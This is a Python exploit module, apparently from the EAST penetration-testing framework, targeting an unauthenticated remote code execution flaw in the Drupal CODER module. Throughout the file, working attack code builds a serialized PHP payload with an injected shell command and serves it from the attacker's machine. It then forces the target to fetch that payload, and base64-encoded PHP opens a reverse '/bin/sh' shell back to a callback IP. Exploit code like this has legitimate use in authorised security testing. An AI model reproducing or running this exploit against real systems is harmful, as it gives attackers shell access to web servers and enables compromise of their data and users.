#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import time
import socket
import base64
import urllib
import urllib2

sys.path.append('./core')
sys.path.append('./shellcodes')
import ShellUtils
import Shellcodes
from Sploit import Sploit
from WebHelper import SimpleWebServer

INFO = {}
INFO['NAME'] = "efa_drupal_coder_rce"
INFO['DESCRIPTION'] = "Drupal CODER Module 7.x - Remote Code Execution"
INFO['VENDOR'] = "https://www.drupal.org/node/2765575"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/40149/']
INFO["CVE Name"] = ""
INFO["NOTES"] = """Module exploits a Remote Command Execution vulnerability in Drupal CODER Module. Unauthenticated users can execute arbitrary command under the context of the web server user.
CODER module doesn't sufficiently validate user inputs in a script file that has the php extension. A malicious unauthenticated user can make requests directly to this file to execute arbitrary command.
 
This module was tested against RESTWS 7.x with Drupal 7.5 installation on Ubuntu 16.04.
"""

INFO['CHANGELOG'] = "26 Oct, 2016. Written by Gleg team."
INFO['PATH'] = 'Exploits/Web/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = "80", dict(description = 'Target Port')
OPTIONS["BASEPATH"] = '/drupal', dict(description = 'Basepath')
OPTIONS["SSL"] = False, dict(description = 'Use SSL')
OPTIONS["CALLBACK_IP"] = "192.168.1.111", dict(description = 'Callback IP')

class exploit(Sploit):
    def __init__(self, host = "", port=0, logger=None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        self.ssl = False
        self.basepath = ""
        self.callback_ip = ''
    
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.basepath = self.args.get('BASEPATH', self.basepath)
        self.ssl = self.args.get('SSL', self.ssl)
        self.callback_ip = self.args.get('CALLBACK_IP', OPTIONS["CALLBACK_IP"])
    
    def make_url(self, path = ''):
        return '{}{}:{}{}{}'.format(self.prot(), self.host, self.port, self.basepath, path)
    
    def prot(self):
        return self.ssl and 'https://' or 'http://'
    
    def make_data(self, payload):
        data = ''
        data +=  'a:6:{s:5:"paths";a:3:{s:12:"modules_base";s:8:"../../..";s:10:"files_base";s:5:"../..";s:14:"libraries_base";s:5:"../..";}'
        data +=  's:11:"theme_cache";s:16:"theme_cache_test";'
        data +=  's:9:"variables";s:14:"variables_test";'
        data +=  's:8:"upgrades";a:1:{i:0;a:2:{s:4:"path";s:2:"..";s:6:"module";s:3:"foo";}}'
        data +=  's:10:"extensions";a:1:{s:3:"php";s:3:"php";}'
        data +=  's:5:"items";a:1:{i:0;a:3:{s:7:"old_dir";s:12:"../../images";'
        data +=  's:7:"new_dir";s:'
        data +=  str(len(payload) + 14)
        data +=  ':"a --help && '
        data +=  payload
        data +=  '";'
        data += 's:4:"name";s:4:"test";}}}'
        return data
    
    def run(self):
        self.args()
        
        if self.is_listener_connected() is None:
            self.log('Please, enable listener to use this module')
            self.finish(False)
        
        #payload = 'start calc.exe'#'echo "' + self.make_sploit()[1:] + '" > east.php'
        php_code = base64.b64encode('$sock=fsockopen("{}",{});exec("/bin/sh -i <&3 >&3 2>&3");'.format(self.callback_ip, self.args['listener']['PORT']))
        
        payload = "php -r 'eval(base64_decode(\"{}\"));'".format(php_code)
        print payload
        evil_data = self.make_data(payload)
        
        self.log('Starting server with payload')
        server = SimpleWebServer(self.callback_ip, 8080)
        server.add_file_for_share("east", evil_data)
        server.start_serve()
        
        self.log('Sending request to update ...')
        url = self.make_url('/modules/coder/coder_upgrade/scripts/coder_upgrade.run.php?file=http://{}:8080/east'.format(self.callback_ip))
        try:
            fd = urllib2.urlopen(url)
            self.log(fd.read())
        except Exception as e:
            self.log('Failed')
            self.log(url)
            self.log(e)
            self.finish(False)
        
        while True:
            if self.is_listener_connected():
                break
            time.sleep(3)
        
        server.stop_serve()
        self.finish(True)
        

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()
